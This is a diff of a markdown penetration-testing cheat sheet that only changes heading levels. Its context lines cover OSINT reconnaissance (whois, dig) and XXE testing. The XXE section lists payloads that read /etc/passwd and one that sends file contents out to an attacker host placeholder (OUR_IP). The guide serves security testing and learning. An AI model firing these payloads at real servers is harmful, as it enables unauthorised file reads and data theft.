@@ -30,7 +30,7 @@ Pentest processing:
 | Social Media Analysis | LinkedIn, Twitter, Facebook, specialised OSINT tools  | Very Low: Accessing public social media profiles is not considered intrusive. |
 | Code Repositories     | GitHub, GitLab                                         | Very Low: Code repositories are meant for public access, and searching them is not suspicious. |
 
-#### ***WHOIS***  
+### ***WHOIS***  
 
 WHOIS is designed to access databases that store information about registered internet resources. WHOIS can also provide details about IP address blocks and autonomous systems.   
 He can be useful for `Phishing Investigation`, `Malware Analysis`, `Threat Intelligence Report`,...   
@@ -38,7 +38,7 @@ He can be useful for `Phishing Investigation`, `Malware Analysis`, `Threat Intel
 whois facebook.com
 ```
 
-#### ***DIG***  
+### ***DIG***  
 The dig command (Domain Information Groper) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records.  
 Here some basics commands :  
 | Command                                | Description                                                            |
@@ -380,7 +380,7 @@ To identify XEE finding web pages that accept an XML or JSON user input with Bur
 
 **Note**: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
 
-### ***Detection of XEE :***
+#### ***Detection of XEE :***
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xee "3"> ]>
@@ -390,7 +390,7 @@ To identify XEE finding web pages that accept an XML or JSON user input with Bur
 </stockCheck>
 ```
 
-### ***Basic Payloads:***
+#### ***Basic Payloads:***
 ```xml
 <!ENTITY xxe SYSTEM "http://localhost/email.dtd">
 <!DOCTYPE foo [<!ENTITY xee SYSTEM "/etc/passwd"> ]>
@@ -398,7 +398,7 @@ To identify XEE finding web pages that accept an XML or JSON user input with Bur
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
 ```
-### ***ByPass with CDATA:***
+#### ***ByPass with CDATA:***
 ```xml
 <!DOCTYPE email [
   <!ENTITY begin "<![CDATA[">
